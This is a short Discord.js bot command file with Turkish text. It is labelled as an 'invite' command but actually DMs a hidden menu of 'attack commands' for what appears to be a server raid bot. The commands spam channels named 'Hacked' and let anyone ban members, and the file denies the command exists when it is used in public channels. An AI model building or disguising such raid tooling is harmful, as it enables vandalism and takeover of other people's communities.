const Discord = require('discord.js');
const client = new Discord.Client();

exports.run = (client, message) => {
  if (message.channel.type !== 'dm') {
    const ozelmesajkontrol = new Discord.RichEmbed()
    .setColor(0x00AE86)
    .setDescription('Böyle Bi Komut Yok ):');
    message.channel.sendEmbed(ozelmesajkontrol) }
	const pingozel = new Discord.RichEmbed()
    .setColor(0x00AE86)
    .setDescription('**Saldırı Komutları**\n\n' + '`+saldır` = "Hacked" diye açabildiği kadar yazı kanalları açar. \n`+ban <banlanacak isim> 1` = İstediğin kişiyi banlar. (Herkes kullana bilir) ' );
    return message.author.sendEmbed(pingozel)
};

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['botu ekle', 'botu davet et', 'botuekle', 'invite'],
  permLevel: 0
};

exports.help = {
  name: 'syardım',
  description: 'Botun davet linkini gönderir.',
  usage: 'syardım'
};
